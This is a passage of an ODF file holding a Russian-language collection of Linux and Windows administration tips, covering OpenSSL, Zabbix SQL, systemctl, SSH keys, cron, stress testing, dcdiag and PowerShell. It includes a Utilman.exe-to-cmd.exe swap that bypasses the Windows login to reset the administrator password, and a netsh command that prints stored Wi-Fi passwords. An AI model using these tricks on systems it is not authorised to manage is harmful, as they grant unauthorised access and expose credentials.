      <text:p text:style-name="P2"><text:span text:style-name="T5">2. OSSEC (https://github.com/ossec/ossec-hids) - всеобъемлющий HIDS с открытым исходным кодом. Выполняет анализ журнала, проверку целостности </text:span><text:soft-page-break/><text:span text:style-name="T5">файлов, мониторинг политик, обнаружение руткитов, оповещение в реальном времени и активное реагирование. Недавно был отдельный пост (https://t.me/hack_less/1525) о данном HIDS.</text:span></text:p>
      <text:p text:style-name="P26">3. Security Onion (https://securityonionsolutions.com/) - это дистрибутив Linux для обнаружения вторжений, мониторинга сетевой безопасности и управления журналами. Он основан на Ubuntu и содержит Snort, Suricata, Bro, OSSEC, Sguil, Squert, Snorby, ELSA, Xplico, NetworkMiner.</text:p>
      <text:p text:style-name="P26">4. Zeek (https://zeek.org/) - это мощная структура сетевого анализа, которая сильно отличается от типичных IDS, которые вы, возможно, знаете.</text:p>
      <text:p text:style-name="P28">5. AIEngine (https://bitbucket.org/camp0/aiengine/src/master/) - это механизм проверки пакетов Python/Ruby/Java/Lua следующего поколения с возможностями обучения без вмешательства человека, функциями NIDS, классификацией доменов DNS, сетевым сборщиком, сетевой криминалистикой и др.</text:p>
      <text:p text:style-name="P26">Проверяем TLS-сертификат удаленного SMTP-сервера. Для проверки сертификата SMTP-сервера можно воспользоваться утилитой OpenSSL. Если вы хотите проверить сертификат с помощью STARTTLS, выполните следующую команду (заменив домен на нужный): openssl s_client -connect mail.example.com:25 -starttls smtp. Или для стандартного защищенного порта: openssl s_client -connect mail.example.com:465. Учтите, что openssl не поддерживает использование хранилища сертификатов Windows, поэтому проверка в Windows всегда будет неудачной. Примеры SQL запросов для базы данных Zabbix: Поиск хоста по имени:</text:p>
      <text:p text:style-name="P26">SELECT * FROM hosts WHERE host like '%name%';</text:p>
      <text:p text:style-name="P26">SELECT * FROM hosts WHERE name like '%name%';</text:p>
      <text:p text:style-name="P26">Поиск элементов данных указанного хоста: SELECT * FROM items WHERE hostid = '10105';</text:p>
      <text:p text:style-name="P26">Поиск истории значений для указанного элемента данных: SELECT * FROM history WHERE itemid = '24526';</text:p>
      <text:p text:style-name="P27">Удалим всю историю элемента данных до 03.06.2022 (время указано в Unix формате, конвертеры можно найти через поисковик): DELETE FROM history WHERE itemid = '24526' AND clock &lt; '1654041600';</text:p>
      <text:p text:style-name="P27">Удаление всей истории данных до 03.06.2022: DELETE FROM history WHERE clock &lt; '1654041600';</text:p>
      <text:p text:style-name="P26">Массово менял интервал и динамику изменений в элементы данных шаблонов и хостов я следующими запросами (первый определяет ID шаблона или хоста, второй изменяет интервалы):</text:p>
      <text:p text:style-name="P26">SELECT * FROM `hosts` WHERE host="Template ICMP Ping";</text:p>
      <text:p text:style-name="P26">UPDATE items SET delay=3600 WHERE hostid=10105 AND delay=600;</text:p>
      <text:p text:style-name="P28">UPDATE items SET trends=180 WHERE hostid=10047 AN</text:p>
      <text:p text:style-name="P26">Шпаргалка по часто используемым командам systemctl:</text:p>
      <text:p text:style-name="P26">1. Посмотреть статус службы. Покажет статус службы на примере сети network - systemctl status network</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Запустить сервис. Запустит сервис баз данных на примере mysql - systemctl start mysql</text:span></text:p>
      <text:p text:style-name="P26">3. Остановить службу. Остановит сервис времени ntpd - systemctl stop ntpd</text:p>
      <text:p text:style-name="P26">4. Перезапустить службу. Перезапустит веб-сервер nginx - systemctl restart nginx</text:p>
      <text:p text:style-name="P26">5. Включить автозапуск службы. Разрешит автозапуск веб-сервера apache - systemctl enable apache</text:p>
      <text:p text:style-name="P26">6. Отключить автозапуск службы. Запретит автозапуск брандмауэра firewalld - systemctl disable firewalld</text:p>
      <text:p text:style-name="P26">7. Выполнить команду на удаленной системе. Остановит cron на компьютере с IP-адресом 192.168.0.15, подключившись под учетной записью root - systemctl --host root@192.168.0.15 stop cron</text:p>
      <text:p text:style-name="P26">8. Перезагрузить сервер. Перезагрузит локальный сервер - systemctl reboot</text:p>
      <text:p text:style-name="P28">9. Проверка работы сервиса. Выполняется с помощью опции is-active. В данном примере мы проверим работу службы docker - systemctl is-active docker. а) Если сервис запущен, мы увидим: active; <text:s/>б) Если не запущен: failed или: inactive; в) Если такого сервиса нет в системе: unknown или: inactive. Если сервис не работает или его нет в системе, команда вернет код ошибки, таким образом конструкция: systemctl is-active docker &amp;&amp; docker run hello-world приведет к выполнению команды docker run hello-world только в том случае, если сервис docker работает.</text:p>
      <text:p text:style-name="P26">Простое копирование ssh ключей между серверами c использованием утилиты ssh-copy-id. Традиционно администраторы решают задачу копирования ssh ключей между серверами путем копирования содержимого файла /root/.ssh/id_rsa.pub с сервера server1 на server2 в файл /root/.ssh/authorized_keys. Копируют обычно из одного терминала в другой, но есть более изящное решение - это использование утилиты ssh-copy-id, которая позволяет скопировать содержимое id_rsa.pub сервера источник (в нашем случае server1) на сервер приемник (server2) в нужный нам authorized_keys не открывая консоль сервера приемника (server2). Исходные данные: 2 сервера с Debian (server1 и server2). Задача: Организовать вход по ssh ключу с сервера server1 на server2 с правами root. Итак сделаем все по порядку: 1. Генерируем публичный открытый и закрытый ключи, под пользователем root на server1: ssh-keygen -t rsa</text:p>
      <text:p text:style-name="P27">Если на сервере уже есть эти ключи, то он выдаст предупреждение, где нужно будет либо подтвердить замену старых ключей либо отказаться. Мы создаем ключи впервые, поэтому предупреждения не будет, будет выведена примерно такая информация:</text:p>
      <text:p text:style-name="P27">Generating public/private rsa key pair.</text:p>
      <text:p text:style-name="P26">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Created directory '/root/.ssh'.</text:p>
      <text:p text:style-name="P26">Enter passphrase (empty for no passphrase): &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Enter same passphrase again: &lt;-- ENTER</text:p>
      <text:p text:style-name="P26">Your identification has been saved in /root/.ssh/id_rsa.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Your public key has been saved in /root/.ssh/id_rsa.pub.</text:span></text:p>
      <text:p text:style-name="P26">Вы можете защитить приватный ключ паролем и тогда чтобы попасть на сервер server2 по ssh ключу нужно будет ввести этот пароль, я настоятельно рекомендую для доступа с уровнем root ввести пароль на приватный ключ. Ключи сгенерированы, мы можем проверить под пользователем root выполнив команду: cat ~/.ssh/id_rsa.pub.</text:p>
      <text:p text:style-name="P26">В ответ увидим примерно: ssh-rsa AAAAB3Nz.....ywWmpl root@server1</text:p>
      <text:p text:style-name="P26">Теперь нужно передать публичный ключ id_rsa.pub пользователя root на server2, для этого на server1 выполняем: ssh-copy-id -i ~/.ssh/id_rsa.pub root@server2</text:p>
      <text:p text:style-name="P26">Вводим пароль root от сервера server2 и ключ будет передан и записан в нужный файл authorized_keys. Важное уточнение: Чтобы передать публичный ключ на server2 под root нужно чтобы пользователю root было разрешен вход по ssh на server2, обычно при базовой установке Debian/Ubuntu вход под root по ssh разрешен, это настраивается директивой PermitRootLogin в файле /etc/ssh/sshd_config</text:p>
      <text:p text:style-name="P26">PermitRootLogin yes - Вход под root по ssh разрешен.</text:p>
      <text:p text:style-name="P26">PermitRootLogin no - Вход под root по ssh запрещен.</text:p>
      <text:p text:style-name="P26">PermitRootLogin without-password - Вход под root по ssh разрешен только по ssh ключам.</text:p>
      <text:p text:style-name="P26">PermitRootLogin forced-commands-only - Вход под root по ssh разрешен только по ssh ключам и только для выполнения заранее определенной команды, сама команда прописывается в /root/.ssh/authorized_keys в формате:</text:p>
      <text:p text:style-name="P26">command="rsync" ssh-rsa AAAAB3N……. root@server2</text:p>
      <text:p text:style-name="P28">После изменения PermitRootLogin не забудьте перезапустить службу sshd командой: service sshd restart</text:p>
      <text:p text:style-name="P26">Конвертация PFX в CRT и KEY. Для ECDSA:</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.key -nodes -nocerts</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_ECDSA.pfx -out certificate_ECDSA.crt -nokeys</text:p>
      <text:p text:style-name="P26">Если pfx запаролен, будет запрошен Import Password.</text:p>
      <text:p text:style-name="P26">Для RSA:</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_RSA.pfx -clcerts -nokeys -out certificate_RSA.crt</text:p>
      <text:p text:style-name="P26">openssl pkcs12 -in certificate_RSA.pfx -nocerts -out certificate_RSA-encrypted.key</text:p>
      <text:p text:style-name="P26">openssl rsa -in certificate_RSA-encrypted.key -out certificate_RSA.key</text:p>
      <text:p text:style-name="P28">Если pfx запаролен, будет запрошен Import Password. Ключ сперва сохраняется в зашифрованном виде, для этого требуется задать PEM pass, который затем нужно указать при расшифровке ключа.</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">Регулярные выражение для поиска IP адресов. Ниже представлены регулярные выражения, которые помогут найти все IP адреса в строке. Данные </text:span><text:soft-page-break/><text:span text:style-name="T5">регулярные выражения соответствуют шаблонам IPv4 и IPv6 адресов. Регулярное Выражение для Поиска IP Адресов.</text:span></text:p>
      <text:p text:style-name="P27">Паттерн для поиска IPv4 адресов, соответствует всем значениям от 0.0.0.0to 999.999.999.999и в большинстве случаев этого бывает достаточно: "([0-9]{1,3}[\.]){3}[0-9]{1,3}"</text:p>
      <text:p text:style-name="P26">Найти Все IP Адреса с Помощью Grep. Пропарсим файл и найдем в нем все IP адреса из диапазона от 0.0.0.0до 999.999.999.999с помощью grep: $ grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" file.txt</text:p>
      <text:p text:style-name="P26">Поиск Правильных IPv4 Адресов. Регулярное выражение для поиска и проверки правильных IPv4 адресов: "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</text:p>
      <text:p text:style-name="P28">Поиск IPv6 Адресов. Регулярное выражение для проверки IPv6 адреса: "((^|:)([0-9a-fA-F]{0,4})){1,8}"</text:p>
      <text:p text:style-name="P26">Увеличение времени сессии SSH. Бывает, что выполнение удаленно запущенной команды может затянуться, а необходимо дождаться ее выполнения (кстати, в этом случае весьма полезным может стать использование screen), или пришлось отвлечься, а сессия SSH в это время отвалилась. У меня на работе подобное случалось часто, поэтому решил увеличить на сервере таймаут сессии ssh, чтобы сохранить и соединение, и собственные нервы. На сервере в конфигурационном файле /etc/ssh/sshd_config прописываем:</text:p>
      <text:p text:style-name="P26">TCPKeepAlive yes</text:p>
      <text:p text:style-name="P26">ClientAliveInterval 300</text:p>
      <text:p text:style-name="P26">ClientAliveCountMax 60</text:p>
      <text:p text:style-name="P28">TCPKeepAlive - установлен в «yes», значит сервер будет периодически пинговать клиента, проверяя жив ли он. ClientAliveInterval - задает интервал пинга для проверки состояния клиента (в секундах). Параметр работает только для протокола версии 2 (Protocol 2). ClientAliveCountMax - количество пингов клиента. Таким образом в моем примере таймаут сессии будет равен 60*300/60 = 300 минут = 5 часов. После изменения настроек не забудьте перезапустить сервис ssh.</text:p>
      <text:p text:style-name="P26">Как ускорить навигацию командной строки? Повторный запуск под root - sudo !!</text:p>
      <text:p text:style-name="P26">user@host: cat /var/log/messages</text:p>
      <text:p text:style-name="P26">cat /var/log/messages: Permission denied.</text:p>
      <text:p text:style-name="P26">Как не надо: Вверх. Влево. Влево. Влево. …. sudo Enter. Рррр.</text:p>
      <text:p text:style-name="P26">Как надо: sudo !!</text:p>
      <text:p text:style-name="P26">Повторный ввод последнего аргумента - Alt+. Вы захотели еще раз воспользоваться только что написанным аргументом? Например, созданной директорией?</text:p>
      <text:p text:style-name="P26">Как не надо: mkdir MyNewDirectory; cd MyNewDirectory</text:p>
      <text:p text:style-name="P26">Как надо: mkdir MyNewDirectory</text:p>
      <text:p text:style-name="P26">cd &lt;Alt+.&gt;</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Поиск запущенной команды - Ctrl+R. Какую же команду я только что запускал? Вверх. Вверх. Вверх. Вверх. О, вот и она! Снова и снова вам приходится копаться в истории, ведь вы не знаете более подходящих альтернатив. Но что, если я скажу вам о том, что есть… поиск?</text:span></text:p>
      <text:p text:style-name="P26">Как не надо: Вверх. Вверх. Вверх. Enter.</text:p>
      <text:p text:style-name="P27">Как надо: Ctrl+R. Просто нажмите Ctrl+R и введите первые буквы нужной команды.</text:p>
      <text:p text:style-name="P27">Если поиск не выдал нужную команду сразу, то нажмите Ctrl+R еще раз. Повторное нажатие используется для прокрутки результатов. Ниже приведен поиск для cat. (reverse-i-search)cat: sudo cat /var/log/messages</text:p>
      <text:p text:style-name="P26">Переход в начальную директорию - cd. Вы не на шутку удивитесь, узнав, сколько людей не знают этого способа! cd. Да, так просто. Без лишних аргументов вы сразу попадете в начальную директорию.</text:p>
      <text:p text:style-name="P26">Возвращение в последнюю директорию - cd -. Иногда простой способ - самый лучший. Допустим, вы были в директории /var/www/foo, а теперь оказались в /etc . Простая команда cd - вернет вас обратно в /var/www/foo .</text:p>
      <text:p text:style-name="P26">Как не надо: cd /var/www/foo</text:p>
      <text:p text:style-name="P26">Как надо: cd -</text:p>
      <text:p text:style-name="P26">Контроль работы: передний план, фоновый режим и прочее. Возможно, вам потребуется какое-то время, чтобы привыкнуть, но оно того стоит. Допустим, вы редактируете файл в vim (вы же не будете этого делать в nano, да?!). И вот вам вдруг захотелось что-то найти в директории /var/www/html. Конечно же, вы можете выйти из vim, перейти в нужную директорию, а потом вдруг решить, что неплохо было бы вернуться к редактированию. Есть и другой вариант - перевести vim в фоновый режим и вернуться к нему позже. Напишите: Ctrl+Z. Эта комбинация переводит все текущие задачи с переднего плана в фоновый режим. Полезно как минимум для: less, cat, man, vim и т.д. «И куда же отправится моя активная задача?» - спросите вы. Напишите jobs и сами узнаете.</text:p>
      <text:p text:style-name="P26">user@host: jobs</text:p>
      <text:p text:style-name="P26">[1] Stopped vim</text:p>
      <text:p text:style-name="P28">Супер. Теперь можно заняться чем-то другим. А как только вы решите вернуться к задаче, напишите fg. Эта команда возвращает фоновую задачу (vim) на передний план. Обратите внимание, что фоновые процессы приостанавливаются. Поэтому если в файле вы выполняли что-то из разряда tail, то для завершения команды потребуется какое-то время. Если же в фоновом режиме запущено несколько задач, то напишите fg 3 , где 3 - это номер задачи для возобновления. Увидеть список задач можно по команде jobs.</text:p>
      <text:p text:style-name="P26">Сохраняем вывода команды Top в файл. Поскольку я не использовал опцию delay, приведенная ниже команда top перенаправит вывод команды top за одну итерацию в файл: top -b -n 1 &gt; /home/i_odmin/backup/output.txt</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Сохранение вывода команды top с более чем одной итерацией из 5 итераций. Обычно программа работает непрерывно с задержкой в 2 секунды, и </text:span><text:soft-page-break/><text:span text:style-name="T5">вы можете изменить это значение, добавив в верхнюю команду значение ‘-d’, как показано ниже: top -n 5 -d 4 -b &gt;/backup/output_1.txt</text:span></text:p>
      <text:p text:style-name="P26">Как захватить вывод команды top в файл каждые 5 минут в течение часа. Система создает отдельный файл каждые 5 минут, который поможет вам определить список процессов, которые потребляли больше CPU и памяти в системе. Добавляем следующий cronjob, который будет выполняться с 5 до 6 утра каждые 5 минут в течение часа. Где:</text:p>
      <text:p text:style-name="P26">-n : Задает максимальное количество итераций.</text:p>
      <text:p text:style-name="P27">-b : Работа в пакетном режиме (Запуск команды top в пакетном режиме для перенаправления вывода в другие программы или в файл)</text:p>
      <text:p text:style-name="P27">-d : Интервал задержки (Задает задержку между обновлениями экрана)</text:p>
      <text:p text:style-name="P26">0-59/5 5 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:p>
      <text:p text:style-name="P26">Собраем вывод в один файл, используйте следующий cronjob. Cronjob будет выполняться с 9 до 10 утра каждые 5 минут в течение часа и добавлять результаты в один файл: 0-59/5 9 * * * top -b -n5 -d 5 &gt;&gt;/home/i_odmin/backup/output.txt</text:p>
      <text:p text:style-name="P28">Записываем вывод команды top в файл каждые 5 минут в течение получаса. Добавляем следующий cronjob, который будет запускаться каждые 5 минут с 13:30 до 14:00 в течение получаса: 30-59/5 13 * * * top -n 10 -d 4 -b &gt; /home/i_odmin/backup/top_out-`date +\%Y\%m\%d\%H\%M\%S`.txt</text:p>
      <text:p text:style-name="P26">Как посмотреть пароли от Wi-Fi к которым вы подключались (для Windows). ОС хранит данные про все Wi-Fi сети к которым вы подключились. Доступ к этой информации можно получить с помощью обычной командной строки. Инструкция:</text:p>
      <text:p text:style-name="P26">1. Открываем "CMD" от имени Администратора. </text:p>
      <text:p text:style-name="P26">2. Вводим команду netsh wlan show profiles (Будет выведены все сети, к которым вы подключались)</text:p>
      <text:p text:style-name="P26">3. Выбираем нужную и вводим netsh wlan show profile name="Имя_сети" key=clear</text:p>
      <text:p text:style-name="P26">"Имя сети" - название нужного Wi-Fi. Если имя сети состоит из двух слов, то возьмите их в кавычки. </text:p>
      <text:p text:style-name="P28">Система покажет всю информацию про эту сеть, в том числе и пароль.</text:p>
      <text:p text:style-name="P26">Stress – это инструмент командной строки Linux, который позволяет нагружать процессор, память, систему ввода-вывода и диск. Установим stress на CentOS, RHEL, Fedora: sudo dnf install stress</text:p>
      <text:p text:style-name="P26">Установим stress на Ubuntu и Debian: sudo apt install stress</text:p>
      <text:p text:style-name="P26">Синтаксис stress: stress [OPTION [ARG]]</text:p>
      <text:p text:style-name="P26">Увеличить нагрузку на процессор. Опция -c или –cpu использует заданное количество воркеров на функции sqrt(), чтобы увеличить нагрузку на процессор и заставить его работать интенсивнее: stress -c N или stress --cpu N</text:p>
      <text:p text:style-name="P26">Следующая команда будет непрерывно загружать 4 ядра процессора: stress --cpu 4</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Задаем тайм-аут для стресса. Чтобы задать работу на определенное время, вы можете использовать опцию -t или –timeout. Следующие команды будут нагружать четыре ядра процессора только в течение 10 с: stress -c 4 -t 10 или stress --cpu 4 --timeout 10</text:span></text:p>
      <text:p text:style-name="P26">Увеличение нагрузки на память. Опция -v или --vm позволяет вам нагрузить виртуальную память: [simterm] $ stress -v N</text:p>
      <text:p text:style-name="P26">Увеличение нагрузки ввода-вывода на диск. Вы можете увеличить нагрузку ввода-вывода с помощью опции -i или –io: stress -i N или stress --io N</text:p>
      <text:p text:style-name="P26">Создаем нагрузка на систему с помощью двух процессов, связанных с вводом-выводом: # stress --io 100</text:p>
      <text:p text:style-name="P27">Мы проверим загрузку IO диска с помощью команды iostat. У меня на сервере доступны диски /dev/vda и /dev/vdb, вы можете проверить активный диск с помощью lsblk или fdisk или любой другой команды.</text:p>
      <text:p text:style-name="P27">Если вы выполните эту команду без каких-либо аргументов, то она покажет дисковые IO для всех доступных дисков: iostat -d /dev/vda -d /dev/vdb 1</text:p>
      <text:p text:style-name="P26">Увеличение нагрузки на диск. Опция -d или –hdd используется для создания нагрузки на диск: stress -d N или stress --hdd N</text:p>
      <text:p text:style-name="P26">Для увеличения нагрузки на диск мы используем следующую команду: stress --hdd 100</text:p>
      <text:p text:style-name="P26">Посмотрим пропускную способность диска с помощью команды vmstat: vmstat 1 100</text:p>
      <text:p text:style-name="P28">Увеличение нагрузки на несколько системных ресурсов (ЦП, память, ввод/вывод). Команде stress можно задать несколько нагрузок. В следующем примере используется 4 ядра ЦП, 2 виртуальных памяти и 1 процесс ввода-вывода для нагрузки на систему в течение 20 секунд: stress --cpu 4 --vm 2 --io 1 -t 20</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">Active Directory: утилита DCDIAG. Утилита dcdiag позволяет выполнить до 20 тестов над инфраструктурой Active Directory. Некоторые из тестов предоставляют диагностическую информацию об определенном контроллере домена. Многие тесты предоставляют информацию о конфигурации репликации в пределах леса. Advertising - Проверяет, правильно ли контроллер домена сообщает о себе и о своей роли хозяина операций. Этот тест завершиться неудачно, если служба NetLogon не запущенаCheckSDRefDom - Проверяет правильность доменов ссылок дескрипторов безопасности для каждого раздела каталогов программ. Connectivity - Проверяет регистрацию DNS для каждого контроллера домена, отправляет тестовый эхо-пакет на каждый контроллер домена и проверяет подключение по протоколам LDAP и RPC к каждому контроллеру домена. CrossRefValidation - Проверяет правильность перекрестных ссылок для доменов. RRSSysvol - проверяет состояние готовности для FRS SYSVOL. FRSEvent - Проверяет ошибки репликации в работе службы репликации файлов, что может означать наличие проблем в репликации SYSVOL и, таким образом, целостности копий объектов групповых политик. FSMOCheck - Не проверяет роли хозяев операций, а вместо этого запрашивает сервер глобального каталога, первичный контроллер домена, </text:span><text:soft-page-break/><text:span text:style-name="T5">предпочтительный сервер времени, сервер времени и центр распространения ключей. Intersite - Проверяет наличие ошибок, которые могут помешать нормальной репликации между сайтами. Компания Microsoft предупреждает, что иногда результаты этого теста могут оказаться неточными. KCCEvent - Проверяет безошибочность создания объектов соединений для репликации между сайтами. KnowsOfRoleHolders - Проверяет возможность подключения контроллеров домена ко всем пяти хозяевам операций. MachineAccount - Проверяет правильность регистрации учетной записи целевого компьютера и правильность объявлений служб этого компьютера. Если обнаружена ошибка, ее можно исправить с помощью утилиты dcdiag, указав параметры /fixmachineaccount или /recreatemachineaccount. NCSecDesc - Проверяет правильность разрешений для репликации в дескрипторах безопасности для заголовков контекста именования. NetLogons - Проверяет правильность разрешений регистрации, позволяющих регистрацию, для каждого контроллера домена. ObjectsReplicated - Проверяет правильность репликации агента сервера каталогов и объектов учетных записей компьютеров. OutboundSecureChannels - Проверяется наличие безопасных каналов между всеми контроллерами домена в интересующем домене.</text:span></text:p>
      <text:p text:style-name="P27">Replications - Проверяет возможность репликации между контроллерами домена и сообщает обо всех ошибках при репликации. RidManager - Проверяет работоспособность и доступность хозяина относительных идентификаторов. Services - Проверяет работоспособность всех служб, необходимых для работы контроллера домена, на указанном контроллере домена. SystemLog - Проверяет безошибочность работы системного журнала. VerifyEnterpriseReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на всех контроллерах домена в лесу. VerifyReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на указанном контроллере домена. VerifyReplicas - Проверяет действительность всех разделов каталога приложения на всех серверах, принимающих участие в репликации. Синтаксис команды dcdiag: dcdiag /s:&lt;DomainController&gt; [/n:&lt;NamingContext&gt;] [[/u:&lt;domain\user&gt;] [/p:&lt;password&gt;] ] [{/a|/e}{/q|/v}] [/i] [/f:&lt;LogFile&gt;] [/ferr:&lt;ErrorLog&gt;] [/c [/skip:&lt;test]] [/test:&lt;test&gt;] [/fix]</text:p>
      <text:p text:style-name="P26">Работа с архивами:</text:p>
      <text:p text:style-name="P26">Создать .tar.gz:</text:p>
      <text:p text:style-name="P26">tar -czvf file.tar.gz /full/path - создать .tar.gz (архив)</text:p>
      <text:p text:style-name="P26">tar -cjvf file.tar.bz2 /full/path - создать .tar.bz2 (архив)</text:p>
      <text:p text:style-name="P26">Распаковать .tar: tar -xvf file.tar.gz</text:p>
      <text:p text:style-name="P26">Распаковать gz: gunzip yourfile.gz</text:p>
      <text:p text:style-name="P26">Распаковать многотомный архив: 7za x arch.7z.001</text:p>
      <text:p text:style-name="P26">Получить листинг файлов в архиве: tar -tf &lt;path_to_tarfile&gt;</text:p>
      <text:p text:style-name="P26">Извлечь конкретный файл из архива: tar -xf &lt;path_to_tarfile&gt; [&lt;file_1_in_archive&gt; &lt;file_2_in_archive&gt; ..]</text:p>
      <text:p text:style-name="P28">Скопировать файл на сервер: scp -P 12322 file.tar login@111.111.111.111:/home/user</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Сброс пароля Windows Server на примере пользователя Администратор/Administrator Windows Server 2012/2016:</text:span></text:p>
      <text:p text:style-name="P26">1 - Нам потребуется образ Windows Server 2016, Windows Server 2012. </text:p>
      <text:p text:style-name="P26">2 - Подключаемся к серверу через IPMI, либо KVM, загружаем образ в VirtualMedia.</text:p>
      <text:p text:style-name="P26">3 - После того, как образ был загружен, выполняем перезагрузку сервера. При загрузке ОС будет сообщение Press any key to boot from CD or DVD. Нажимаем любую клавишу и дожидаемся загрузки файлов. После загрузки файлов появится окно с выбором первоначальных параметров, жмём Далее. После этого нажимаем Восстановление системы.</text:p>
      <text:p text:style-name="P26">4 - В выборе действия нажимает Диагностика.</text:p>
      <text:p text:style-name="P26">5 - Далее выбираем Командная строка. Для начала необходимо найти системный диск, выполним команду: echo %windir%</text:p>
      <text:p text:style-name="P26">6 - Команда выведет системный диск. Переходим в него: C:</text:p>
      <text:p text:style-name="P26">7 - В случае, если диск C является системным. Далее переходим в System32: cd Windows\System32</text:p>
      <text:p text:style-name="P26">8 - Далее переименовываем Utilman.exe на Utilman.exe.old: ren Utilman.exe Utilman.exe.old</text:p>
      <text:p text:style-name="P27">9 - Выполняем замену cmd на Utilman.exe: copy cmd.exe Utilman.exe</text:p>
      <text:p text:style-name="P27">10 - После этого закрываем консоль и нажимаем кнопку Продолжить. После загрузки сервера появится экран ввода логина и пароля. Нажимаем Win + U и вводим следующую команду: net user Администратор new_password, где new_password -- новый пароль пользователя Администратор. В EN-локализации пользователь имеет названиме Administrator.</text:p>
      <text:p text:style-name="P26">Полезные команды Linux. Атрибуты файлов:</text:p>
      <text:p text:style-name="P26">chattr +a file - Разрешает только добавление данных в файл</text:p>
      <text:p text:style-name="P26">chattr +d file - Игнорировать данный файл при создании резервной копии с помощью программы dump</text:p>
      <text:p text:style-name="P26">chattr +c file - Разрешить ядру автоматически сжимать/разжимать содержимое файла</text:p>
      <text:p text:style-name="P26">chattr +i file1 - Защита файла от каких либо изменений или манипуляций: редактирование, перемещение, удаление, создание ссылок на него</text:p>
      <text:p text:style-name="P26">chattr +S file1 - Определяет, будет-ли при сохранении изменений, произведена синхронизация, как при использовании команды sync</text:p>
      <text:p text:style-name="P26">chattr +u file1 - При удалении файла с данным атрибутом, его будет сохранено, что-бы оставить пользователю возможность восстановить данные в случае необходимости</text:p>
      <text:p text:style-name="P26">chattr +s file1 - Позволяет безвозвратное удаление данного файла. При удалении файла с этим атрибутом, место на диске, занимаемое файлом, перезаписывается нулями, после чего файл уже не подлежит восстановлению</text:p>
      <text:p text:style-name="P28">lsattr - Листинг файлов с атрибутами</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Работа с файлами и папками PowerShell. Перечисление всех файлов и папок в папке. Все элементы можно получить непосредственно в папке с помощью Get-ChildItem. Для отображения скрытых и системных элементов </text:span><text:soft-page-break/><text:span text:style-name="T5">добавьте необязательный параметр Force. Например, эта команда отображает прямое содержимое диска C:PowerShell: Get-ChildItem -Path C:\ -Force. Команда перечисляет только непосредственно содержащиеся элементы, например команду dir в cmd.exe оболочке UNIX или ls в ней. Чтобы отобразить элементы в вложенной папке, необходимо указать параметр Recurse . Следующая команда выводит список всех элементов на C: диске: Get-ChildItem -Path C:\ -Force -Recurse. Командлет Get-ChildItem позволяет отфильтровать элементы с помощью параметров Path, Filter, Include и Exclude, но обычно осуществляется лишь фильтрация по имени. Вы можете выполнять сложную фильтрацию на основе других свойств элементов с помощью Where-Object. Следующая команда находит все исполняемые файлы в папке Program Files, которые были изменены после 1 октября 2005 года, и они не меньше 1 мегабайт или больше 10 мегабайт:</text:span></text:p>
      <text:p text:style-name="P26">Get-ChildItem -Path $env:ProgramFiles -Recurse -Include *.exe |</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Where-Object -FilterScript {</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>($_.LastWriteTime -gt '2005-10-01') -and ($_.Length -ge 1mb) -and ($_.Length -le 10mb)</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P26">Копирование файлов и папок. Копирование выполняется с помощью командлета Copy-Item. Следующая команда создает резервную копию скрипта профиля PowerShell:</text:p>
      <text:p text:style-name="P27">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak')</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Команда Test-Path проверка, существует ли скрипт профиля. Если целевой файл уже существует, то попытка копирования завершается неудачей. Чтобы перезаписать имеющийся целевой файл, используйте параметр Force.</text:p>
      <text:p text:style-name="P26">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>Copy-Item -Path $PROFILE -Destination $($PROFILE -replace 'ps1$', 'bak') -Force</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Эта команда работает, даже если целевой объект доступен только для чтения. Так же выполняется и копирование папок. Эта команда копирует папку C:\temp\test1 в новую папку C:\temp\DeleteMe рекурсивно: Copy-Item C:\temp\test1 -Recurse C:\temp\DeleteMe. Можно также скопировать избранные элементы. Следующая команда копирует все .txt файлы, содержащиеся в любом месте в C:\dataC:\temp\text:</text:p>
